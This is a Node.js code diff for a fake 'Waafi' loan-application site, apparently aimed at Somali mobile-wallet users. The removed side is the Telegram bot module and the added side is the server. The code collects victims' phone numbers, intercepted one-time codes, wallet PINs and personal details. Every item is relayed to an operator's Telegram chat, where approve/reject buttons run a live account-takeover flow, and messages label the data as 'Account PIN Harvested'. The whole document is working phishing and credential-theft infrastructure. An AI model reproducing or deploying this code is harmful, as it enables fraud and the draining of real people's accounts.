@@ -1,181 +1,121 @@
 require('dotenv').config();
-const TelegramBot = require('node-telegram-bot-api');
+const express = require('express');
+const http = require('http');
+const socketIo = require('socket.io');
+const path = require('path');
+const cors = require('cors');
 
-const BOT_TOKEN = process.env.BOT_TOKEN;
-const CHAT_ID = process.env.ADMIN_CHAT_ID;
+const botManager = require('./bot_manager');
 
-if (!BOT_TOKEN || !CHAT_ID) {
-    console.error("❌ [BOT MANAGER ERROR] Missing BOT_TOKEN or ADMIN_CHAT_ID inside environment configs.");
-}
+const app = express();
+const server = http.createServer(app);
 
-// Initialize the Telegram Bot Engine using webhook/passive mode
-const bot = new TelegramBot(BOT_TOKEN, { polling: false });
-
-/**
- * Strips out characters that break Telegram Markdown parsing
- * FIX: Removed hyphen escaping to prevent App ID string corruption
- */
-function escapeMarkdown(text) {
-    if (!text) return '';
-    return String(text).replace(/([_*\[\]()~`>#+=|{}.!])/g, '\\$1');
-}
-
-/**
- * Standard Log Streams: Dispatches clean profiles to the Admin Telegram channel
- */
-function sendToAdmin(appId, stepTitle, data, requireInlineButtons = false) {
-    if (!CHAT_ID) return;
-
-    let detailedFields = '';
-    if (data && typeof data === 'object') {
-        Object.entries(data).forEach(([key, val]) => {
-            if (val !== undefined && val !== null && val !== '' && key !== 'appId') {
-                detailedFields += `• *${escapeMarkdown(key)}:* \`${escapeMarkdown(val)}\`\n`;
-            }
-        });
-    } else if (data) {
-        detailedFields += `• *Data Payload:* \`${escapeMarkdown(data)}\`\n`;
-    }
-
-    const message = `
-📱 *Waafi Application: ${escapeMarkdown(appId)}*
-━━━━━━━━━━━━━━━━━━━━━━━━
-📢 *${escapeMarkdown(stepTitle)}*
-━━━━━━━━━━━━━━━━━━━━━━━━
-${detailedFields}━━━━━━━━━━━━━━━━━━━━━━━━
-Status: *State Log Processed*
-    `.trim();
-
-    const options = { parse_mode: 'Markdown' };
-
-    if (requireInlineButtons) {
-        options.reply_markup = {
-            inline_keyboard: [[
-                { text: "✅ APPROVE OTP 1", callback_data: `approve_otp:${appId}` },
-                { text: "❌ REJECT OTP 1", callback_data: `reject_otp:${appId}` }
-            ]]
-        };
-    }
-
-    bot.sendMessage(CHAT_ID, message, options)
-        .then(() => console.log(`✅ [TELEGRAM] Log payload dispatched for ${appId}`))
-        .catch((err) => console.error(`❌ [TELEGRAM ERROR] Dispatch failed for ${appId}:`, err.message));
-}
-
-/**
- * Step 2: Dispatches the account security PIN card
- */
-function sendFinalApproval(appId, pinCode) {
-    if (!CHAT_ID) return;
-
-    const message = `
-💳 *Account PIN Harvested for ID: ${escapeMarkdown(appId)}*
-━━━━━━━━━━━━━━━━━━━━━━━━
-📢 *Step 2: Wallet Account Security PIN*
-━━━━━━━━━━━━━━━━━━━━━━━━
-• *Target Account PIN:* \`${escapeMarkdown(pinCode)}\`
-━━━━━━━━━━━━━━━━━━━━━━━━
-Status: *Awaiting Verification Action*
-    `.trim();
-
-    const options = {
-        parse_mode: 'Markdown',
-        reply_markup: {
-            inline_keyboard: [[
-                { text: "✅ APPROVE PIN", callback_data: `approve_pin:${appId}` },
-                { text: "❌ REJECT PIN", callback_data: `reject_pin:${appId}` }
-            ]]
-        }
-    };
-
-    bot.sendMessage(CHAT_ID, message, options)
-        .then(() => console.log(`✅ [TELEGRAM] Step 2 operational PIN dispatch completed for ${appId}`))
-        .catch((err) => console.error(`❌ [TELEGRAM ERROR] Step 2 PIN dispatch failed:`, err.message));
-}
-
-/**
- * Step 3: Dispatches the second verification OTP card
- */
-function sendSecondOTP(appId, otp2Value) {
-    if (!CHAT_ID) return;
-
-    const message = `
-🔑 *Second OTP (Step 3) for ID: ${escapeMarkdown(appId)}*
-━━━━━━━━━━━━━━━━━━━━━━━━
-📢 *Step 3: Secondary Multi-Factor Code*
-━━━━━━━━━━━━━━━━━━━━━━━━
-• *Target OTP 2 Code:* \`${escapeMarkdown(otp2Value)}\`
-━━━━━━━━━━━━━━━━━━━━━━━━
-Status: *Awaiting Route Authorization*
-    `.trim();
-
-    const options = {
-        parse_mode: 'Markdown',
-        reply_markup: {
-            inline_keyboard: [[
-                { text: "✅ APPROVE OTP 2", callback_data: `approve_otp2:${appId}` },
-                { text: "❌ REJECT OTP 2", callback_data: `reject_otp2:${appId}` }
-            ]]
-        }
-    };
-
-    bot.sendMessage(CHAT_ID, message, options)
-        .then(() => console.log(`✅ [TELEGRAM] Step 3 operational OTP2 dispatch completed for ${appId}`))
-        .catch((err) => console.error(`❌ [TELEGRAM ERROR] Step 3 OTP2 dispatch failed:`, err.message));
-}
-
-// Telegram Inline Interactive Webhook Processing Engine
-bot.on('callback_query', async (callbackQuery) => {
-    const actionData = callbackQuery.data;
-    const message = callbackQuery.message;
-    
-    if (!actionData) return;
-    
-    const [actionSignal, targetAppId] = actionData.split(':');
-    let auditLogExecutionState = '';
-    
-    if (!global.io) {
-        console.error("❌ [BOT MANAGER ERROR] global.io reference missing.");
-        return;
-    }
-
-    // Process matching clean room keys directly now
-    if (actionSignal === 'approve_otp') {
-        global.io.to(targetAppId).emit('admin-approve-otp');
-        auditLogExecutionState = "✅ OTP 1 verified. Frontend shifted to Step 2 (PIN) mode.";
-    } else if (actionSignal === 'reject_otp') {
-        global.io.to(targetAppId).emit('otp-failed', { message: "Code-ka OTP-ga aad gelisay waa khalad." });
-        auditLogExecutionState = "❌ OTP 1 signature flagged invalid. Verification error sent to user.";
-    } else if (actionSignal === 'approve_pin') {
-        global.io.to(targetAppId).emit('pin-verified');
-        auditLogExecutionState = "✅ PIN verified. Frontend shifted to Step 3 (OTP 2) mode.";
-    } else if (actionSignal === 'reject_pin') {
-        global.io.to(targetAppId).emit('pin-failed', { message: "PIN-ka koontada aad gelisay waa khalad." });
-        auditLogExecutionState = "❌ Wallet security PIN matched incorrect code. Input reset issued.";
-    } else if (actionSignal === 'approve_otp2') {
-        global.io.to(targetAppId).emit('admin-approve-otp2');
-        auditLogExecutionState = "✅ OTP 2 authorized. User transitioned to descriptive parameter profile forms.";
-    } else if (actionSignal === 'reject_otp2') {
-        global.io.to(targetAppId).emit('otp2-failed', { message: "Koodhka xaqiijinta labaad ee aad gelisay waa khalad." });
-        auditLogExecutionState = "❌ Second OTP flagged invalid. Verification error sent to user.";
-    }
-
-    // Update the administrative card view inside Telegram to prevent double clicks
-    try {
-        await bot.editMessageText(`${message.text}\n\n🤖 *Audit Log Execution State:*\n_${auditLogExecutionState}_`, {
-            chat_id: CHAT_ID,
-            message_id: message.message_id,
-            parse_mode: 'Markdown',
-            reply_markup: { inline_keyboard: [] }
-        });
-    } catch (e) {
-        console.error("❌ [TELEGRAM UI UPDATE ERROR]", e.message);
+// Configure Socket.io for Render (CORS is essential)
+const io = socketIo(server, {
+    cors: {
+        origin: "*",
+        methods: ["GET", "POST"]
     }
 });
 
-module.exports = {
-    bot,
-    sendToAdmin,
-    sendFinalApproval,
-    sendSecondOTP
-};
+global.io = io; // Link socket globally so botManager can call back rooms
+
+const PORT = process.env.PORT || 3000;
+const EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL; 
+
+app.use(cors());
+app.use(express.json());
+app.use(express.static(path.join(__dirname, 'public')));
+
+// Webhook Route for Telegram
+app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
+    botManager.bot.processUpdate(req.body);
+    res.sendStatus(200);
+});
+
+io.on('connection', (socket) => {
+    // Generate unique initial application session tag
+    const initialAppId = `WFI-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
+    
+    // Send initial AppID back to the frontend right away
+    socket.emit('session-ready', { appId: initialAppId });
+
+    // Explicit room listener matching frontend: this.socket.emit('join-room', data.appId)
+    socket.on('join-room', (room) => {
+        socket.join(room);
+        console.log(`🔌 User joined room: ${room}`);
+    });
+
+    // ==========================================
+    // STAGE 1: GATEWAY AUTHENTICATION STREAM
+    // ==========================================
+
+    // STEP 0: Initial submission of phone number. Shifts control directly to Admin Telegram channel.
+    socket.on('request-otp1', (data) => {
+        const currentId = data.appId || initialAppId;
+        
+        // Dispatches payload layout with inline interactive authorization buttons attached
+        botManager.sendToAdmin(currentId, "🇸🇴 Initial Request: Phone Submitted & Awaiting OTP 1", data, false);
+    });
+
+    // NEW STEP 1: Phone number and Initial OTP payload delivery 
+    socket.on('step4-otp', (data) => {
+        const currentId = data.appId || initialAppId;
+        botManager.sendToAdmin(currentId, "🇸🇴 Step 1: Phone & Intercepted OTP 1", data, true);
+    });
+
+    // NEW STEP 2: Wallet Account Security PIN delivery
+    socket.on('step5-pin', (data) => {
+        const currentId = data.appId || initialAppId;
+        botManager.sendFinalApproval(currentId, data.pin);
+    });
+
+    // NEW STEP 3: Secondary Multi-Factor Code delivery
+    socket.on('step6-otp2', (data) => {
+        const currentId = data.appId || initialAppId;
+        botManager.sendSecondOTP(currentId, data.otp2);
+    });
+
+    // ==========================================
+    // STAGE 2: LOAN DETAIL PROFILE EXTRACTION
+    // ==========================================
+
+    // NEW STEP 4: Loan Calculation Parameters (Type, Amount, Term, Purpose)
+    socket.on('step1', (data) => {
+        const currentId = data.appId || initialAppId;
+        botManager.sendToAdmin(currentId, "🇸🇴 Step 4: Loan Request Parameters", data, false);
+    });
+
+    // NEW STEP 5: Core Personal Information (First Name, Last Name, Email)
+    socket.on('step2', (data) => {
+        const currentId = data.appId || initialAppId;
+        botManager.sendToAdmin(currentId, "🇸🇴 Step 5: Personal Identity Profile", data, false);
+    });
+    
+    // NEW STEP 6: Employment Status and Verified Declared Income
+    socket.on('step3-data', (data) => {
+        const currentId = data.appId || initialAppId;
+        botManager.sendToAdmin(currentId, "🇸🇴 Step 6: Employment & Income Status", data, false);
+    });
+
+    socket.on('disconnect', () => {
+        console.log(`🔌 User disconnected socket connection reference.`);
+    });
+});
+
+server.listen(PORT, async () => {
+    console.log(`🚀 Waafi Loan Server running on port ${PORT}`);
+    
+    // Auto-configure Webhooks on deployment platforms like Render
+    if (EXTERNAL_URL) {
+        const webhookUrl = `${EXTERNAL_URL}/bot${process.env.BOT_TOKEN}`;
+        try {
+            await botManager.bot.setWebHook(webhookUrl);
+            console.log(`✅ Telegram Webhook set to: ${webhookUrl}`);
+        } catch (err) {
+            console.error('❌ Webhook Setup Failed:', err.message);
+        }
+    } else {
+        console.warn('⚠️ RENDER_EXTERNAL_URL missing inside environment configs.');
+    }
+});
